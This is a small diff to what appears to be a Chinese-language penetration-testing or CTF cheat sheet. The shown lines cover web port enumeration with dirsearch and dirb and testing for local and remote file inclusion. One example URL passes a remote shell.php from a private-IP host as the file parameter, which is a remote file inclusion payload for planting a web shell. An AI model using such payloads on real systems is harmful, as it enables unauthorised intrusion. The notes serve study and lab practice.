@@ -56,7 +56,7 @@ QUIT
 同时在/etc/hosts写入
 
 **80**：网页端，用浏览器查看，同时
-# 注意查看网页源码
+`# 注意查看网页源码`
 1. `dirsearch -u ip`或`dirb -u http://IP -X .txt .html .js`
 查看是否有文件包含等漏洞。文件包含漏洞不只内部文件包含，比如/etc/passwd等，还有外部文件包含,比如
 `http://example.com?file=http://192.168.71.128:85/shell.php`
